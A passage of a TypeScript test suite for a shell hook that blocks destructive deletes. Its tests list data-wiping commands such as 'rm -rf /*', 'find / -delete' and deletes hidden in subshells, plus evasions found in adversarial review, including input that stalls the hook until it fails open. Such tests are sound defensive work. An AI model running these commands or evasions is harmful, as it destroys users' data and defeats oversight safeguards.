    await expectAllowed('rm -rf "${CACHE:?cache path required}"/*');
    await expectAllowed('rm -rf "${BUN_CACHE:?}"/*');
    expect(emptyExpansionCollapse("${BUN_CACHE:?}/*")).toBeNull();
    // `${VAR?}` without the colon permits an empty value, which is the whole hazard.
    expect(emptyExpansionCollapse("${BUN_CACHE?}/*")).toBe("/*");
  });

  test("privilege and scheduling prefixes do not hide the delete", async () => {
    for (const command of [
      String.raw`\rm -rf /*`,
      `'rm' -rf /*`,
      "command rm -rf /*",
      "nohup rm -rf /* &",
      "setsid rm -rf /*",
    ]) {
      await expectBlocked(command);
    }
  });

  test("non-rm destructive tools targeting the root are blocked", async () => {
    await expectBlocked("find / -delete");
    await expectBlocked("find / -exec rm -rf {} \\;");
    await expectBlocked("rsync -a --delete /var/empty/ /");
  });

  // -------------------------------------------------------------------------------------
  // Adversarial review round 2. Each of these got a full wipe past the first draft of this
  // change, and the first two were REGRESSIONS it introduced against the previous release.
  // -------------------------------------------------------------------------------------

  test("a delete inside a command substitution is still a delete", async () => {
    // Regression guard. Making $( ) atomic for the collapse rule removed the accidental
    // coverage the old segment splitter gave, so `echo $(rm -rf /)` became invisible: the
    // delete runs and only its OUTPUT is discarded.
    for (const command of [
      "echo $(rm -rf /home/hasna/.hasna)",
      "x=$(rm -rf /home/hasna/.hasna)",
      "$(rm -rf /home/hasna/.hasna)",
      "$(rm -rf /*)",
      "x=$(rm -rf /*)",
      'echo "$(cd / && rm -rf *)"',
      "echo `rm -rf /*`",
      'files=$(rm -rf "$(bun pm cache)"/*)',
    ]) {
      await expectBlocked(command);
    }
  });

  test("a glob anywhere in the path counts, not only in the last component", async () => {
    // `rm -rf /*/*` destroys /usr/*, /etc/*, /home/* - the incident's outcome, respelled.
    for (const command of [
      "rm -rf /*/*",
      "rm -rf /*/*/*",
      "rm -rf /**/*",
      "rm -rf /home/*/*",
      "rm -rf ~/*/*",
      "rm -rf /home/*/.hasna",
      "rm -rf /*/bin",
      "find /*/x -delete",
    ]) {
      await expectBlocked(command);
    }
  });

  test("a bounded glob earlier in the path still does not over-block", async () => {
    const home = mkdtempSync(join(tmpdir(), "hooks-midglob-"));
    try {
      await expectAllowed(`rm -rf ${home}/proj*/dist`, { home });
      await expectAllowed("rm -rf /var/log/*.gz", { home });
      await expectAllowed("rm -rf /etc/nginx/sites-enabled/*", { home });
      await expectAllowed("rm -rf /var/lib/docker/*", { home });
    } finally {
      try { rmSync(home, { recursive: true, force: true }); } catch {}
    }
  });

  test("brace alternations are expanded", async () => {
    await expectBlocked("rm -rf /{bin,boot,etc,home,lib,opt,root,srv,usr,var}");
    await expectBlocked("rm -rf /{,usr,etc}");
    await expectBlocked("rm -rf ~/{.hasna,Downloads}");
    await expectAllowed("rm -rf ./{dist,build}");
  });

  test("combinatorial brace input cannot stall the hook into failing open", async () => {
    // Brace expansion is combinatorial: 26 groups is 2^26 paths. A version that capped only
    // the finished list took 19.75s, past this hook's 20s timeout - and a timed-out hook
    // fails open, so a long enough brace string would switch the guard off and then delete.
    const command = `rm -rf ${Array.from({ length: 26 }, (_, i) => `/{a${i},b${i}}`).join("")}`;
    const started = performance.now();
    await classify(command);
    expect(performance.now() - started).toBeLessThan(2000);
  });

  test("cd in a subshell or pipeline does not move the guard, and cd - comes back", async () => {
    // Regression guard: tracking `cd` naively made these WEAKER than before the change,
    // because the tracker followed a `cd` that the real shell confines to a child process.
    const cwd = "/home/hasna/.hasna/projects/workspaces";
    for (const command of [
      "cd /var/tmp && ls && cd - && rm -rf *",
      "(cd /var/tmp && ls); rm -rf *",
      "cd /var/tmp | cat; rm -rf *",
      "cd /var/tmp; cd $OLDPWD; rm -rf *",
      "for f in a b; do (cd /var/tmp); done; rm -rf *",
    ]) {
      await expectBlocked(command, { cwd });
    }
    await expectAllowed("cd /var/tmp && rm -rf scratch", { cwd });
  });

  test("shell options taking a value do not hide the -c script", async () => {
    for (const command of [
      "bash -o errexit -c 'rm -rf /*'",
      "bash -o pipefail -c 'rm -rf /*'",
      "sh -o errexit -c 'rm -rf /*'",
      "bash --rcfile /dev/null -c 'rm -rf /*'",
    ]) {
      await expectBlocked(command);
    }
  });

  test("expansion nesting has no depth limit", async () => {
    await expectBlocked('rm -rf "$(dirname "$(dirname "$(bun pm cache)")")"/*');
    await expectBlocked('rm -rf "${A:-${B}}"/*');
    expect(emptyExpansionCollapse("${A:-${B}}/*")).toBe("/*");
  });

  test("expansions the shell cannot return empty are not treated as collapsible", async () => {
    // These block routine cleanup if mishandled, and a guard that blocks routine work
    // gets switched off - which is how this class of incident recurs.
    await expectAllowed('rm -rf "$(pwd)"/*');
    await expectAllowed('rm -rf "$PWD"/*');
    await expectAllowed('rm -rf "${BUILD_DIR:-/tmp/build}"/*');
    await expectAllowed('BUILD=/tmp/build && rm -rf "$BUILD"/*');
    // ...but only where the guarantee is real.
    await expectBlocked('rm -rf "${BUILD_DIR-/tmp/build}"/*');
    await expectBlocked('BUILD=$(some-command) && rm -rf "$BUILD"/*');
  });
});
